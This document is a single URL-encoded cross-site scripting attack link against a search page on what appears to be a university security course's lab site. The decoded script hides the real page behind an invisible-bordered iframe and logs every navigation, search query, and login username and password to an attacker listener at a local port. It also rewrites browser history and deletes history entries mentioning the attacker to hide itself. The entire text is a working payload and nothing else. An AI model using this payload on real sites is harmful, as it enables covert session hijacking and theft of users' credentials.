http://bungle-cs461.csl.illinois.edu/search?xssdefense=0&q=%3Cscript%3E%0D%0Afunction%20payload%28attacker%29%20%0D%0A%7B%0D%0A%20%20%20%20var%20targetURL%3D%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2F%22%3B%0D%0A%20%20%20%20var%20firstFlag%20%3D%200%3B%0D%0A%20%20%20%20var%20searchFlag%3D0%3B%0D%0A%20%20%20%20var%20originalFlag%3D0%3B%0D%0A%20%20%20%20var%20bufferNext%3D%22%22%3B%0D%0A%20%20%20%20var%20loginIndex%3D0%3B%0D%0A%20%20%20%20var%20logoutIndex%3D0%3B%0D%0A%0D%0A%20%20%20%20function%20log%28data%29%20%0D%0A%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20console.log%28%24.param%28data%29%29%3B%0D%0A%20%20%20%20%20%20%20%20%24.get%28attacker%2C%20data%29%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20function%20proxy%28%29%20%0D%0A%20%20%20%20%7B%0D%0A%09%24%28%27body%27%29.children%28%29.width%280%29%3B%0D%0A%09%24%28%27body%27%29.children%28%29.height%280%29%3B%0D%0A%20%20%20%20%20%20%20%20%24%28%27body%27%29.children%28%29.hide%28%29%3B%0D%0A%20%20%20%20%20%20%20%20var%20frameUsed%20%3D%20%24%28%27%3Ciframe%20id%3D_record%3E%27%29%0D%0A%20%20%20%20%20%20%20%20.attr%28%27src%27%2CtargetURL%29%0D%0A%20%20%20%20%20%20%20%20.attr%28%27sandbox%27%2C%20%27allow-forms%20allow-scripts%20allow-same-origin%27%29%0D%0A%20%20%20%20%20%20%20%20.css%28%7B%0D%0A%09%20%20%20%20%20%20%20%20width%3A%20%27100%25%27%2C%0D%0A%09%20%20%20%20%20%20%20%20height%3A%20%27100%25%27%2C%0D%0A%09%20%20%20%20%20%20%20%20background%3A%20%27white%27%2C%0D%0A%09%20%20%20%20%20%20%20%20position%3A%20%27absolute%27%2C%0D%0A%09%20%20%20%20%20%20%20%20border%3A%200%0D%0A%09%20%20%20%20%7D%29%0D%0A%20%20%20%20%20%20%20%20.appendTo%28%27body%27%29%0D%0A%20%20%20%20%20%20%20%20.load%28function%28%29%20%0D%0A%20%20%20%20%20%20%20%20%7B%0D%0A%20%20%20%20%09%20%20%20%20%24%28%27body%27%2Cthis.contentDocument%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20.find%28%27a%27%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20.click%28function%28%29%20%0D%0A%09%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log%28%7Bevent%3A%27nav%27%2C%20user%3A%20%24%28%22%23_record%22%29.contents%28%29.find%28%22%23logged-in-user%22%29.text%28%29%2Curi%3A%20this.href%7D%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.history.replaceState%28%7B%7D%2C%22%22%2Cthis.href%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20.end%28%29%0D%0A%20%20%20%20%09%20%20%20%20.find%28%27form%27%29%0D%0A%20%20%20%20%09%20%20%20%20.submit%28function%28%29%20%0D%0A%20%20%20%20%09%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28%24%28this%29.attr%28%27action%27%29%3D%3D%22.%2Fsearch%22%29%0D%0A%09%20%20%20%20%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%09%09window.history.replaceState%28%7B%7D%2C%22%22%2C%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fq%3D%22%20%2B%20%24%28%22%23_record%22%29.contents%28%29.find%28%22%23query%22%29.val%28%29%29%3B%0D%0A%20%20%20%20%20%20%20%20%09%09log%28%7Bevent%3A%27nav%27%2C%20user%3A%20%24%28%22%23_record%22%29.contents%28%29.find%28%22%23logged-in-user%22%29.text%28%29%2Curi%3A%20%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3F%22%20%2B%20%22q%3D%22%20%2B%20%24%28%22%23_record%22%29.contents%28%29.find%28%22%23query%22%29.val%28%29%7D%29%3B%0D%0A%09%09%09searchFlag%3D1%3B%0D%0A%09%09%09originalFlag%3D1%3B%0D%0A%09%09%09loginIndex%3D0%3B%0D%0A%09%09%09logoutIndex%3D0%3B%0D%0A%09%09%09bufferNext%3D%24%28%22%23_record%22%29.contents%28%29.find%28%22%23query%22%29.val%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%09else%20if%28%24%28this%29.attr%28%27action%27%29%20%3D%3D%20%22.%2Flogin%22%29%20%0D%0A%09%20%20%20%20%09%7B%0D%0A%09%09%09loginIndex%3D1%3B%0D%0A%20%20%20%20%20%20%20%20%09%09log%28%7Bevent%3A%20%27login%27%2C%20user%3A%20%20%24%28this%29.serialize%28%29.substring%28%20%24%28this%29.serialize%28%29.indexOf%28%22%3D%22%29%20%2B%201%2C%20%20%24%28this%29.serialize%28%29.indexOf%28%22%26%22%29%29%2C%20pass%3A%20%20%24%28this%29.serialize%28%29.substring%28%20%24%28this%29.serialize%28%29.lastIndexOf%28%22%3D%22%29%20%2B%201%2C%20%20%24%28this%29.serialize%28%29.length%29%7D%29%3B%0D%0A%09%09%09window.history.replaceState%28%7B%7D%2C%22%22%2CtargetURL%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%20if%28%24%28this%29.attr%28%27action%27%29%20%3D%3D%20%22.%2Flogout%22%29%0D%0A%09%20%20%20%20%09%7B%0D%0A%09%09%09logoutIndex%3D1%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%09%09log%28%7Bevent%3A%20%27logout%27%2C%20user%3A%20%24%28%22%23_record%22%29.contents%28%29.find%28%22%23logged-in-user%22%29.text%28%29%7D%29%3B%0D%0A%09%09%09window.history.replaceState%28%7B%7D%2C%22%22%2CtargetURL%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20.end%28%29%3B%0D%0A%0D%0A%09%20%20%20%20%24%28%22%23_record%22%29.contents%28%29.find%28%22.history-item%22%29.remove%28%22%3Acontains%28%27attacker%27%29%22%29%3B%0D%0A%09%20%20%20%20if%28firstFlag%20%3D%3D%200%29%0D%0A%09%20%20%20%20%7B%0D%0A%09%20%20%20%20%20%20%20%20window.history.replaceState%28%7B%7D%2C%22%22%2CtargetURL%29%3B%0D%0A%09%20%20%20%20%20%20%20%20log%28%7Bevent%3A%20%22nav%22%2C%20user%3A%20%24%28%22%23_record%22%29.contents%28%29.find%28%22%23logged-in-user%22%29.text%28%29%2Curi%3A%20targetURL%7D%29%3B%0D%0A%09%20%20%20%20%20%20%20%20firstFlag%20%3D%201%3B%0D%0A%20%20%20%09%20%20%20%20%7D%0D%0A%0D%0A%09%20%20%20%20if%28targetURL%21%3Dwindow.location.href%26%26searchFlag%21%3D0%26%26loginIndex%3D%3D0%26%26logoutIndex%3D%3D0%29%0D%0A%09%20%20%20%20%7B%0D%0A%09%09if%28window.history.pushState%26%26searchFlag%3D%3D2%29%0D%0A%09%09%7B%0D%0A%09%09%09window.history.replaceState%28%7B%7D%2C%22%22%2CtargetURL%29%3B%0D%0A%09%09%09searchFlag%3D1%3B%0D%0A%09%09%09originalFlag%3D1%3B%0D%0A%09%09%7D%0D%0A%09%09else%0D%0A%09%09searchFlag%3D2%3B%09%0D%0A%09%20%20%20%20%7D%0D%0A%09%20%20%20%20if%28targetURL%3D%3Dwindow.location.href%26%26originalFlag%21%3D0%26%26loginIndex%3D%3D0%26%26logoutIndex%3D%3D0%29%0D%0A%09%20%20%20%20%7B%0D%0A%09%09if%28window.history.pushState%26%26originalFlag%3D%3D2%29%0D%0A%09%09%7B%0D%0A%09%09%09window.history.replaceState%28%7B%7D%2C%22%22%2C%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fq%3D%22%2BbufferNext%29%3B%0D%0A%09%09%09searchFlag%3D2%3B%0D%0A%09%09%09originalFlag%3D1%3B%0D%0A%09%09%7D%0D%0A%09%09else%0D%0A%09%09originalFlag%3D2%3B%0D%0A%09%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20proxy%28%29%3B%0D%0A%7D%3Bpayload%28%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22%29%3B%3C%2Fscript%3E
